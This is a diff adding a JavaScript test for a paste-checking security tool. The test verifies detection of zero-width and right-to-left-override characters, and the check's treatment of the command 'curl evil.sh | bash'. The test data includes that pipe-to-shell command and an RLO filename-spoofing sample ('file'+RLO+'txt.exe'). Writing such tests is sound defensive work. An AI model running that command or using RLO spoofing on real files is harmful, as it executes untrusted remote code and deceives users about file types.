@@ -136,3 +136,24 @@ test('README headings match in number, meaning, order and depth; language links 
   assert.match(english, /\*\*Day033 - 100 Security Tools with Generative AI\*\*/);
   assert.doesNotMatch(english, /<!--\s*---/);
 });
+
+test('ユースケースの「このツールならではの使い方」の判定は shared.js と一致する（日英）', async () => {
+  const { checkPasteText } = await import('../js/shared.js');
+  const ZW = String.fromCharCode(0x200B);
+  const RLO = String.fromCharCode(0x202E);
+  const zw = checkPasteText('ab' + ZW + 'c');
+  assert.equal(zw.key, 'paste.warning');
+  assert.equal(zw.invisible.length, 1);
+  assert.deepEqual([zw.invisible[0].hex, zw.invisible[0].position], ['200B', 3]);
+  const rlo = checkPasteText('file' + RLO + 'txt.exe');
+  assert.equal(rlo.key, 'paste.warning');
+  assert.equal(rlo.bidi.length, 1);
+  assert.deepEqual([rlo.bidi[0].hex, rlo.bidi[0].position], ['202E', 5]);
+  const cmd = checkPasteText('curl evil.sh | bash');
+  assert.equal(cmd.key, 'paste.clear');
+  assert.deepEqual([cmd.invisible.length, cmd.bidi.length], [0, 0]);
+  for (const doc of [readme, english]) {
+    assert.ok(doc.includes('U+200B') && doc.includes('U+202E'));
+    assert.ok(doc.includes('curl evil.sh | bash'));
+  }
+});
